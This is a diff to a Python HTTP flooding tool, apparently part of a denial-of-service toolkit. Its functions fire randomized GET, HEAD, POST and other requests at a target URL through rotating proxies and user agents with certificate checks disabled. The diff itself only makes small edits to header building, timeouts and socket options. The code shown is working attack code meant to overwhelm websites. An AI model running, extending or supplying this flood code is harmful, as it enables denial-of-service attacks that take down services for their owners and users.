@@ -7,10 +7,6 @@ from src.utils import *
 from src.core import *
 from src.proxy import *
 
-# disable "InsecureRequestWarning"'s
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-
 def http_get(worker_id, session, target_url, attack_duration, useragent=None, referer=None):
     '''
     HTTP GET flood
@@ -174,7 +170,7 @@ def http_ghp(worker_id, session, target_url, attack_duration, useragent=None, re
         try:
 
             method_choice = randint(0,2)
-            if method_choice == 0: session.head(f'{target_url}{buildblock(target_url)}', headers={'User-Agent': choice(ualist) if useragent == None else useragent}, verify=False, timeout=(7,5), allow_redirects=False, stream=False, proxies=giveproxy())
+            if method_choice == 0: session.head(f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), verify=False, timeout=(7,5), allow_redirects=False, stream=False, proxies=giveproxy())
             elif method_choice == 1: session.get(f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), verify=False, timeout=(7,5), allow_redirects=False, stream=False, proxies=giveproxy())
             elif method_choice == 2: # url encoded data flood only
                 url_encoded_data = f'{choice(keywords)}={choice(keywords)}'
@@ -244,6 +240,7 @@ def http_mix(worker_id, session, target_url, attack_duration, useragent=None, re
             methods = ['GET', 'POST', 'HEAD', 'PATCH', 'DELETE', 'PUT', 'TRACE', 'CONNECT', 'OPTIONS', randstr(randint(2,6)).upper(), 'HEHE']
             shuffle(methods)
             method = choice(methods)
+            
             if method == 'POST': 
                 data = f'{choice(keywords)}={choice(keywords)}'
                 for _ in range(randint(0, 12)):
@@ -325,8 +322,8 @@ def http_proxy(worker_id, proto, target_url, attack_duration, useragent=None, re
             s = socks.socksocket()
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.setsockopt(socket.SOL_SOCKET, socket.TCP_NODELAY, 1)
-            s.setsockopt(socket.SOL_SOCKET, socket.SOL_LINGER,1) # throws way any data when the connection closes
-            s.settimeout(4)
+            s.setsockopt(socket.SOL_SOCKET, socket.SOL_LINGER, 1) # throws way any data when the connection closes
+            s.settimeout(5)
 
             s.set_proxy(proto, str(proxip), int(proxport))
             s.connect( (host, int(port) ))
